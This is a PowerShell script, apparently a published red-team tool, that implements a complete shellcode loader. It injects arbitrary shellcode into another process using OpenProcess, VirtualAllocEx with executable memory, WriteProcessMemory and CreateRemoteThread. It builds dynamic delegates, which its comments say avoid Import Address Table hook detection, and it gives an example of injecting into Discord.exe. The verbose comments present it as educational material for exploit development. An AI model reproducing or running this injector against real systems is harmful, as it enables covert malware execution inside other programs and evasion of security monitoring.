function Load-Shellcode {
#.SYNOPSIS
# Standalone PowerShell Script for Remote Process Injection utilizing Function Pointer Delegates
# Arbitary Version Number: v1.0.3
# Author: Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Predominantly educational shellcode injector with overly verbose comments.  The idea is to be fairly
# modular, and documented to be an educational resource for those getting into exploit development
# (though PowerShell is an interesting choice for exploit development).
#
# This tool does not utilize Add-Type or any embedded C# -- rather it utilizes custom delegates to
# wrap Win32 function pointers.  This prevents detection via Import Address Table (IAT) hooks.
#
# Win32 API Calls Utilized:
#  |__ OpenProcess()
#  |__ VirtualAllocEx()
#  |__ WriteProcessMemory()
#  |__ CreateRemoteThread()
#
# The `-Shellcode` parameter is intentionally undeclared and written to accept most shellcode formats.
# Currently supports strings [string] and byte arrays [byte[]].  If a standard array [array] is used,
# the array will be converted to a string prior to language detection. If a byte array is used, no
# formatting will occur.
#
# Supported String Formats:
#   o  Path to Raw Shellcode    --  .\shellcode.bin
#   o  Python Shellcode Format  --  'b"\x45\x78\x61\x6d\x70\x6c\x65"'
#   o  C Shellcode Format       --  '\x45\x78\x61\x6d\x70\x6c\x65'
#   o  C++/C# Shellcode Format  --  '{0x45,0x78,0x61,0x70,0x6c,0x65}'
#
# Works with both Windows PowerShell and PowerShell Core (Pwsh). Using 64-bit PowerShell sessions
# allows for both 64-bit and 32-bit injection, whereas 32-bit sessions only allow 32-bit injection.
#
# Parameters:
#   -Shellcode  -->  Shellcode to execute (can be a byte array or string containing file path or bytes).
#   -TargetPID  -->  Target process PID to inject into. 
#   -Debug      -->  Pause execution and print shellcode address for process attachment.
#   -Help       -->  Return Get-Help information.
#
# Example Usage:
#  _____________________________________________________________________________
# |                                                                             |
# | # Inject shellcode variable into the current PowerShell process (and debug) |
# | PS> Load-Shellcode -Shellcode $calc64 -TargetPID $PID -Debug                |
# |                                                                             |
# | # Inject shellcode binary into 'Discord.exe'                                |
# | PS> $DiscordPID = (Get-Process -Name Discord).Id | Select -First 1          |
# | PS> Load-Shellcode -Shellcode .\calc64.bin -TargetPID $DiscordPID           |
# |_____________________________________________________________________________|
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS


    Param(
        $Shellcode,         # Intentionally vague type for maximum compatibility
        [int]   $TargetPID, 
        [switch]$Please, 
        [switch]$Debug, 
        [switch]$Help
    )


    # Return Get-Help information
    if ($Help) { return (Get-Help Load-Shellcode) }


    # Error Correction
    if (!$Shellcode) { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if (!$TargetPID) { return (Write-Host '[!] Error! Missing target process PID.' -ForegroundColor Red) }
    if (!(Get-Process -Id $TargetPID 2>$NULL)) { return (Write-Host "[!] Error! Unable to find process with PID of '${TargetPID}'." -ForegroundColor Red) }


    # Internal Function(s)
    function Format-ByteArray ($Shellcode) {

        # Function Description   : PowerShell Script (mini version) to Convert Multi-Language Shellcode Strings into Byte Arrays
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Format-ByteArray.ps1

        # Print data type
        Write-Host "[!] Detecting Data Type of Shellcode Parameter:" -ForegroundColor Yellow
        Write-Host " o  BaseType : $($Shellcode.GetType().BaseType)"
        Write-Host " o  Name     : $($Shellcode.GetType().Name)"
        
        # Checking format before parsing
        if ($Shellcode -is [array]) {
            
            # Shellcode is already formatted as a byte array
            if ($Shellcode -is [Byte[]]) {
                Write-Host '[!] Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
                Write-Host ' o  --> No formatting required.'
                $shellcodeBuffer = $Shellcode
            }
            # Convert array to a string for attempted parsing
            else {
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode parameter is an [array].'
                Write-Host ' o  --> Converting to [string]...'
                $Shellcode = $Shellcode -join ''
            }
        }
    
        # Attempt to determine what language the shellcode is formatted for
        if ($Shellcode -is [String]) {
            
            $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')

            # Check if $Shellcode is a path to a shellcode file
            #   > Path to Raw Shellcode  :  .\shellcode.bin

            if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
                
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is a path to a file.'

                $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
                $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)

                Write-Host " o  --> Path : $ShellcodePath"
                Write-host ' o  --> Reading file bytes...'
            }

            # Format C or Python formatted shellcode string into PowerShell format
            #   > Python Shellcode Format  :  'b"\x45\x78\x61\x6d\x70\x6c\x65"'
            #   > C Shellcode Format       :  '\x45\x78\x61\x6d\x70\x6c\x65'

            elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
                
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C or Python.'
                Write-Host ' o  --> Formatting for PowerShell...'

                # Convert to PowerShell ASCII array
                $Shellcode = $Shellcode.Replace(' ','')
                $psShellcode = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]

                # Convert Shellcode ASCII array to Byte Array
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
            }

            # Format C++ or C# formatted shellcode string into PowerShell format
            #   > C++ / C# Shellcode Format  :  '{0x45,0x78,0x61,0x70,0x6c,0x65}'

            elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
                
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
                Write-Host ' o  --> Formatting for PowerShell...'

                # Convert to PowerShell ASCII array
                $Shellcode = $Shellcode.Replace(' ','')
                $psShellcode = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'

                # Convert Shellcode ASCII array to Byte Array
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
            }

            else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
        }
        
        # Return shellcode byte array
        if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
        Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"
        return ,$shellcodeBuffer
    }
    function Load-Win32Function ([string]$Library, [string]$FunctionName, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void]) {

        # Function Description   : PowerShell Script (mini version) to Load Win32 API Calls into Session via Function Pointers and Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Load-Win32Function.ps1

        ### Step 1: Acquire Memory Address of Target Win32 Function

        Try {
            if ($PSVersionTable.PSEdition -eq 'Core') {
            
                # Get a handle to the target library via Load() method
                $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                if (($LibraryHandle -eq 0) -or ($LibraryHandle -eq $NULL)) { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }

                # Acquire the memory address of the target function via GetExport() method
                $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
            else {
        
                # Get a reference to System.dll in the Global Assembly Cache (GAC)
                $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                $UnsafeMethods  = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

                # Get a reference to the GetModuleHandle() and GetProcAddress() functions
                $GetModuleHandle = ($UnsafeMethods.GetMethods() | ? {$_.Name -eq 'GetModuleHandle'})[0]
                $GetProcAddress  = ($UnsafeMethods.GetMethods() | ? {$_.Name -eq 'GetProcAddress'})[0]

                # Get a handle to the target library (module) via GetModuleHandle()
                $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                if (($LibraryHandle -eq 0) -or ($LibraryHandle -eq $NULL)) { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }

                # Acquire the memory address of the target function (proc) via GetProcAddress() 
                $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
        }
        Catch {
            Write-Host "[!] Error acquiring function memory address! Return details:" -ForegroundColor Red
            $Error[0]
            $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
            $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
            return
        } 

        ### Step 2: Build Win32 Function Delegate for Parameter Types and Return Types

        # Check if the function delegate already exists in the current session
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($FunctionName, $False)
            if ($CustomType -ne $NULL) {
                $FunctionDelegate = $CustomType
                break
            }
        }

        if (!$FunctionDelegate) {

            Try {
                # Generate a unique in-memory .NET assembly name to host delegate type
                $DynAssembly = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())

                # Define non-persistent assembly in memory with execute-only permissions
                $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())

                # Define new delegate type to match unmanaged Win32 function signature
                $TypeBuilder = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

                # Define special constructor for the delegate type (required by CLR to instantiate the delegate from a function pointer)
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')

                # Define 'Invoke' method with the correct function parameter type(s) and return type(s)
                $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')

                # Return the usable, dynamic delegate type for function pointer invocation
                $FunctionDelegate = $TypeBuilder.CreateType()
            }
            Catch {
                Write-Host "[!] Error building function delegate! Return details:" -ForegroundColor Red
                $Error[0]
                $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
                $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
                return
            }
        }

        # Return usable function to session
        return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
    }
    function Build-Win32Struct ([string]$StructName, [array]$MembersObject) {

        # Function Description   : PowerShell Script (mini version) to Create Win32 Data Structures in Memory
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Build-Win32Struct.ps1

        # Check if the struct type already exists in the current session
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($StructName, $False)
            if ($CustomType -ne $NULL) { return $CustomType }
        }

        # Generate a unique in-memory .NET assembly name to host delegate type
        $DynAssembly = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())

        # Define non-persistent assembly in memory with execute-only permissions
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())

        # Create a public value type (struct) with sequential memory layout for unmanaged interop
        $Attributes  = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])

        # Define public fields for each struct member
        foreach ($Member in $MembersObject) {
            [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public')
        }

        # Return the value type (struct) definition as a usable .NET type
        return $TypeBuilder.CreateType()
    }
    

    ### Load Win32 API Calls required for Execution

    Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow
    Try {
        $OpenProcessArgs = @(
            [UInt32], # dwDesiredAccess
            [Bool],   # bInheritHandle
            [UInt32]  # dwProcessId
        )
        $OpenProcess = Load-Win32Function -Library "Kernel32.dll" -FunctionName "OpenProcess" -ParamTypes $OpenProcessArgs -ReturnType ([IntPtr])
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'OpenProcess()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'

        $VirtualAllocExArgs = @(
            [IntPtr], # hProcess
            [IntPtr], # lpAddress
            [UInt32], # dwSize
            [UInt32], # flAllocationType
            [UInt32]  # flProtect
        )
        $VirtualAllocEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualAllocEx" -ParamTypes $VirtualAllocExArgs -ReturnType ([IntPtr])
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'VirtualAllocEx()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'

        $WriteProcessMemoryArgs = @(
            [IntPtr],                # hProcess
            [IntPtr],                # lpBaseAddress
            [byte[]],                # lpBuffer
            [UInt32],                # nSize
            [UInt32].MakeByRefType() # lpNumberOfBytesWritten
        )
        $WriteProcessmemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "WriteProcessMemory" -ParamTypes $WriteProcessMemoryArgs -ReturnType ([Bool])
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'WriteProcessMemory()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'

        $CreateRemoteThreadArgs = @(
            [IntPtr],                # hProcess
            [IntPtr],                # lpThreadAttributes
            [UInt32],                # dwStackSize
            [IntPtr],                # lpStartAddress
            [IntPtr],                # param
            [UInt32],                # dwCreationFlags
            [UInt32].MakeByRefType() # lpThreadId
        )
        $CreateRemoteThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateRemoteThread" -ParamTypes $CreateRemoteThreadArgs -ReturnType ([IntPtr])
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'CreateRemoteThread()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
    }
    Catch { return (Write-Host '[!] Error! Failed to load Win32 API calls.' -ForegroundColor Red) }


    ### Initialize Key Variables & Constants for later API Calls

    $TargetProcess           = Get-Process -Id $TargetPID
    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode
    if ($ShellcodeBuffer -isnot [byte[]]) { return }

    # Reference: https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
    $Process = @{
        PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF;
        PROCESS_CREATE_THREAD     = 0x0002;
        PROCESS_QUERY_INFORMATION = 0x0400;
        PROCESS_VM_OPERATION      = 0x0008;
        PROCESS_VM_READ           = 0x0010;
        PROCESS_VM_WRITE          = 0x0020;
    }
    # Reference: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    $Allocation = @{
        MEM_COMMIT  = 0x00001000;
        MEM_RESERVE = 0x00002000;
    }
    # Reference: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
    $Protection = @{
        PAGE_EXECUTE           = 0x10;
        PAGE_READWRITE         = 0x04;
        PAGE_EXECUTE_READWRITE = 0x40;
    }


    ### (1) Acquire handle to the target process 

    Write-Host "[!] Acquiring handle to target process..." -ForegroundColor Yellow

    # OpenProcess()
    #  > Description : Acquire a handle to process.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

    # Argument(s)
    $dwDesiredAccess = $Process.PROCESS_ALL_ACCESS  # Desired access rights                (i.e., PROCESS_ALL_ACCESS).
    $bInheritHandle  = $FALSE                       # Created processes inherit the handle (i.e., no -- ignore this).
    $dwProcessId     = $TargetProcess.Id            # Target process to be opened          (i.e., process PID).
    
    Try {
        $TargetProcessHandle = $OpenProcess.Invoke($dwDesiredAccess, $bInheritHandle, $dwProcessId)

        #if (!$Please) { $TargetProcessHandle = [Win32]::OpenProcess($dwDesiredAccess, $bInheritedHandle, $dwProcessID)    }
        #else          { $TargetProcessHandle = [Var1.Api]::OpenProcess($dwDesiredAccess, $bInheritedHandle, $dwProcessID) }
    }
    Catch { return (Write-Host "[!] Error! Failed to acquire handle to target process via OpenProcess().`n o  Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red) }

    Write-Host ' o  ' -NoNewline ; Write-Host 'OpenProcess()' -ForegroundColor Green
    Write-Host " o  --> Target Process : $($TargetProcess.ProcessName)"
    Write-Host " o  --> Target PID     : $($TargetProcess.Id)"
    Write-host " o  --> Process Handle : ${TargetProcessHandle}"  


    ### (2) Allocate memory within target process

    Write-Host "[!] Allocating executable memory within '$($TargetProcess.ProcessName)'..." -ForegroundColor Yellow

    # VirtualAllocEx()
    #  > Definition : Allocates memory within an external process and returns a pointer to said space.
    #  > Location   : Kernel32.dll
    #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    
    # Argument(s)
    $hProcess         = $TargetProcessHandle                                 # Handle to the target process                     (i.e., acquired from OpenProcess()).
    $lpAddress        = [IntPtr]::Zero                                       # Starting address in memory to allocate           (i.e., if null this is dynamically determined).
    $dwSize           = $shellcodeBuffer.Length                              # Size of the memory allocation in bytes           (i.e., size of shellcode).
    $flAllocationType = $Allocation.MEM_COMMIT -bor $Allocation.MEM_RESERVE  # Flags for memory allocation type                 (i.e., MEM_COMMIT and MEM_RESERVE).
    $flProtect        = $Protection.PAGE_EXECUTE_READWRITE                   # Memory protection flags for the allocated region (i.e., PAGE_EXECUTE_READWRITE).

    Try { 
        $TargetAddress = $VirtualAllocEx.Invoke($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect)

        #if (!$Please) { $TargetAddress = [Win32]::VirtualAllocEx($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect)    }
        #else          { $TargetAddress = [Var2.Api]::VirtualAllocEx($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect) }
    }
    Catch { return (Write-Host "[!] Error! Failed to allocate memory via VirtualAllocEx().`n o  Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red)  }

    Write-Host ' o  ' -NoNewline ; Write-Host 'VirtualAllocEx()' -ForegroundColor Green
    Write-Host " o  --> Allocated Memory Address : ${TargetAddress}"
    Write-Host " o  --> Memory Block Size        : ${dwSize} bytes"


    ### (3) Write memory to allocated space

    Write-Host "[!] Writing buffer to allocated memory..." -ForegroundColor Yellow

    # WriteProcessMemory()
    #  > Definition : Write data to an area of memory within a specified process.
    #  > Location   : Kernel32.dll
    #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

    # Argument(s)
    $hProcess               = $TargetProcessHandle    # Handle to the target process                       (i.e., acquired from OpenProcess()).
    $lpBaseAddress          = $TargetAddress          # Starting address in memory to begin writing        (i.e., acquired from VirtualAllocEx()).
    $lpBuffer               = $shellcodeBuffer        # Pointer to the memory to copy                      (i.e., target shellcode).
    $nSize                  = $shellcodeBuffer.Length # Size of the memory to copy                         (i.e., size of the shellcode).
    $lpNumberOfBytesWritten = 0                       # Output variable to receive number of bytes written (i.e., essentially a throwaway variable).
 
    Try {
        $MemoryCopied = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten)

        #if (!$Please) { $MemoryCopied = [Win32]::WriteProcessMemory($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten)    }
        #else          { $MemoryCopied = [Var3.Api]::WriteProcessMemory($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten) }
    }
    Catch { return (Write-Host "[!] Error! Failed to write shellcode via WriteProcessMemory().`n o  Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red) }

    Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green
    Write-Host " o  --> Shellcode Buffer Copied : ${MemoryCopied}"


    ### Optional: Debug Mode to Attach to Process

    if ($Debug) {
        
        Write-Host "[!] Debug mode activated..." -ForegroundColor Yellow
        Write-Host ' o  Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance to debug.'
        
        if ([Environment]::Is64BitProcess) { $hexAddress = '{0:X}' -f [Int64]$TargetAddress }
        else                               { $hexAddress = '{0:X}' -f [Int32]$TargetAddress }
        
        Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host "0x${hexAddress}" -ForegroundColor Green
        Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ANY KEY TO EXECUTE SHELLCODE.' -ForegroundColor Red
        $NULL = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
    }


    ### (4) Execute shellcode via a Remote Thread

    Write-Host "[!] Executing shellcode..." -ForegroundColor Yellow

    # CreateRemoteThread()
    #  > Definition  :  Create a thread to execute within the address space of a specfied process.
    #  > Location    :  Kernel32.dll
    #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread

    # Argument(s)
    $hProcess          = $TargetProcessHandle  # Handle to the target process                              (i.e., acquired from OpenProcess())
    $lpThreadAtributes = [IntPtr]::Zero        # Pointer to SECURITY_ATTRIBUTES struct                     (i.e., optional and null by default)
    $dwStackSize       = 0                     # Initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
    $lpStartAddress    = $TargetAddress        # Pointer to the memory address to be executed              (i.e., executable shellcode memory address)
    $param             = [IntPtr]::Zero        # Pointer to a variable to be passed to the thread          (i.e., 0 means none)
    $dwCreationFlags   = 0                     # Creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
    $lpThreadId        = 0                     # Pointer to a variable that receives the thread identifier (i.e., 0 for a throwaway variable)

    Try {
        $thread = $CreateRemoteThread.Invoke($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId)

        #if (!$Please) { $thread = [Win32]::CreateRemoteThread($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId)    }
        #else          { $thread = [Var4.Api]::CreateRemoteThread($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId) }
    }
    Catch { return (Write-Host "[!] Error! Failed to create thread via CreateRemoteThread().`n o  Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red) }
    
    Write-Host ' o  ' -NoNewline ; Write-Host 'CreateRemoteThread()' -ForegroundColor Green
    Write-Host " o  --> Returned Thread : ${thread}" -NoNewline
}